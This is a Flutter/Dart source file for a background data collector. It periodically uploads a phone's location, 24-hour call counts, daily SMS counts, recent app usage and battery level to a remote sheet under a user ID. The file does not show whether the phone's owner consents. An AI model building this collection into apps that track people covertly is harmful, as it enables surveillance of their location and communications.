import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:geolocator/geolocator.dart';
import 'package:call_log/call_log.dart';
import 'package:usage_stats/usage_stats.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../background_service_helper.dart';

class DataCollector {
  static Future<void> collectAndSync(String userId) async {
    debugPrint("🚀 DataCollector: Starting sync for $userId");
    
    // 0. SERVICE HEARTBEAT
    await _sendData(userId, "Service_Heartbeat", "Active_${DateTime.now().toIso8601String()}");

    // A. LOCATION
    try {
      debugPrint("📍 DataCollector: Requesting Location...");
      Position position = await Geolocator.getCurrentPosition(
        locationSettings: const LocationSettings(
          accuracy: LocationAccuracy.medium,
        ),
      ).timeout(const Duration(seconds: 15));
      
      Map<String, dynamic> locData = {
        'lat': position.latitude,
        'lng': position.longitude,
        'speed': position.speed,
        'accuracy': position.accuracy,
      };
      await _sendData(userId, "Location", jsonEncode(locData));
    } catch (e) {
      debugPrint("Location Error or Timeout: $e");
      await _sendData(userId, "System_Log", "Location_Error: $e");
    }

    // B. CALL LOGS (Last 24h)
    try {
      debugPrint("📞 DataCollector: Querying Call Logs...");
      int now = DateTime.now().millisecondsSinceEpoch;
      Iterable<CallLogEntry> entries = await CallLog.query(
        dateFrom: now - (24 * 60 * 60 * 1000),
      ).timeout(const Duration(seconds: 10));
      
      Map<String, int> callStats = {
        'incoming': entries.where((c) => c.callType == CallType.incoming).length,
        'outgoing': entries.where((c) => c.callType == CallType.outgoing).length,
        'missed': entries.where((c) => c.callType == CallType.missed).length,
        'rejected': entries.where((c) => c.callType == CallType.rejected).length,
      };
      await _sendData(userId, "Call_Stats_24h", jsonEncode(callStats));
    } catch (e) {
      debugPrint("Call Log Error or Timeout: $e");
    }

    // C. SMS (Daily Count)
    try {
      debugPrint("💬 DataCollector: Querying SMS...");
      final SmsQuery query = SmsQuery();
      List<SmsMessage> inbox = await query.querySms(
        kinds: [SmsQueryKind.inbox],
      ).timeout(const Duration(seconds: 10));
      
      List<SmsMessage> sent = await query.querySms(
        kinds: [SmsQueryKind.sent],
      ).timeout(const Duration(seconds: 10));

      int receivedToday = inbox.where((m) => _isToday(m.date)).length;
      int sentToday = sent.where((m) => _isToday(m.date)).length;

      Map<String, int> smsData = {
        "received_today": receivedToday,
        "sent_today": sentToday,
        "total_today": receivedToday + sentToday,
      };

      await _sendData(userId, "SMS_Activity", jsonEncode(smsData));
    } catch (e) {
      debugPrint("SMS Error or Timeout: $e");
    }

    // D. APP USAGE (Last 15m)
    try {
      debugPrint("📱 DataCollector: Querying Usage Stats...");
      DateTime end = DateTime.now();
      DateTime start = end.subtract(const Duration(minutes: 15));
      List<UsageInfo> usage = await UsageStats.queryUsageStats(start, end)
          .timeout(const Duration(seconds: 10));

      Map<String, String> appUsage = {};
      for (var u in usage) {
        int totalTime = int.parse(u.totalTimeInForeground ?? "0");
        if (totalTime > 1000) {
          appUsage[u.packageName ?? "unknown"] = "${(totalTime / 1000).toStringAsFixed(1)}s";
        }
      }
      if (appUsage.isNotEmpty) {
        await _sendData(userId, "App_Usage_15m", jsonEncode(appUsage));
      }
    } catch (e) {
      debugPrint("Usage Stats Error or Timeout: $e");
    }

    // E. BATTERY STATUS
    try {
      final prefs = await SharedPreferences.getInstance();
      final level = prefs.getInt('last_battery_level') ?? 0;
      await _sendData(userId, "Battery_Status", "$level%");
    } catch (e) {
      debugPrint("Battery Status Error: $e");
    }
    
    debugPrint("✅ DataCollector: Sync Complete");
  }

  // Helper method to consolidate sending logic
  static Future<void> _sendData(
    String userId,
    String dataType,
    String value,
  ) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      String currentId = prefs.getString('user_id') ?? userId;
      await BackgroundServiceHelper.sendToSheet(currentId, dataType, value);
      debugPrint("Data Sent: $dataType");
    } catch (e) {
      debugPrint("Network Error: $e");
    }
  }

  static bool _isToday(DateTime? date) {
    if (date == null) return false;
    final now = DateTime.now();
    return date.year == now.year &&
        date.month == now.month &&
        date.day == now.day;
  }
}
